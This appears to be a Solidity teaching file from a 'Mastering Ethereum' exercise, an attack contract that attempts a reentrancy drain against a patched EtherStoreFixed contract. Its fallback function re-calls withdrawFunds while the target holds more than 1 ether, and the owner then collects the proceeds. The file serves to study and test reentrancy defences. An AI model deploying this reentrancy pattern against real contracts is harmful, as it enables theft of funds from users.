// SPDX-License-Identifier: CC-BY-NC-SA-4.0
pragma solidity 0.6.12;

import "@openzeppelin/contracts/access/Ownable.sol";
import {EtherStoreFixed as UntrustedEtherStore} from "./EtherStoreFixed.sol";

/**
 * @title Mastering Ethereum Chapter 9, Attack contract.
 * @author Victor Navascues.
 * @notice Attempts to exploit EtherStoreFixed contract.
 * @dev This contract differs from the book implementation in:
 *  - It inherits from oppenzeppelin access `Ownable` contract, implementing
 *  an access modifier in the `collectEther()` function. Just for learning
 *  purposes.
 *
 *  - It implements some Consensys' best practices (link below):
 *    - https://consensys.github.io/smart-contract-best-practices/recommendations
 *
 *    - Contract layout (type declarations, state variables, events, and
 *    functions).
 *    - Mark untrusted contracts. NA.
 *    - Function arguments with leading underscore.
 *    - Log names starting with `Log`.
 *    - Don't use `transfer()` or `send()`.
 *    - Handle errors in external calls.
 *    - Use modifiers only for checks.
 *    - Improved `fallback()` (e.g. simple, log an event, and check data
 *    length). NA.
 *    - Use events to monitor contract activity.
 *    - Lock pragmas to specific compiler version.
 *
 *  - Added the optional message in `require()`. Ideally it should be no longer
 *  than 32 bytes (not applied).
 */
contract AttackFixed is Ownable {
    UntrustedEtherStore public untrustedEtherStore;

    event LogFallbackCall(address _sender, uint256 _value);

    constructor(address _untrustedEtherStoreAddress) public {
        untrustedEtherStore = UntrustedEtherStore(_untrustedEtherStoreAddress);
    }

    // solhint-disable-next-line no-empty-blocks
    receive() external payable {}

    // solhint-disable-next-line no-complex-fallback
    fallback() external payable {
        // Log `fallback()` calls for checking successful reentrancy attacks.
        emit LogFallbackCall(msg.sender, msg.value);

        if (address(untrustedEtherStore).balance > 1 ether) {
            untrustedEtherStore.withdrawFunds(1 ether);
        }
    }

    function attackUntrustedEtherStore() public payable onlyOwner {
        require(msg.value >= 1 ether, "Requires 1 ether");
        untrustedEtherStore.depositFunds{value: 1 ether}();
        untrustedEtherStore.withdrawFunds(1 ether);
    }

    function collectEther() public onlyOwner {
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transaction failed");
    }
}
